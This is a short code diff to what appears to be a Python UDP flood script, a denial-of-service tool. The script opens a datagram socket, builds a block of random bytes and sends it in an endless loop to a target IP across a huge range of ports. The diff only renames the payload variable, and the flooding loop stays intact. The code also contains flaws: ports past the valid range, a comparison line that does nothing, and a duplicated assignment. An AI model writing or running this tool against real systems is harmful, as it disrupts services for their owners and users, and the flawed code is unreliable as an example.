@@ -10,8 +10,8 @@ R = '\033[31m'
 N = '\033[0m'
 
 white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-random = random._urandom(35516)
-random = random._urandom(35512)
+Kbytes = random._urandom(35516)
+Kbytes = random._urandom(35512)
 
 os.system("clear")
 
@@ -53,7 +53,7 @@ time.sleep(3)
 while True:
     sent = 0
     for port in range(1, 15000000):
-        white.sendto(random, (ip, port))
+        white.sendto(Kbytes, (ip, port))
         sent = sent + 1
         sent==15000000
         port = port + 1
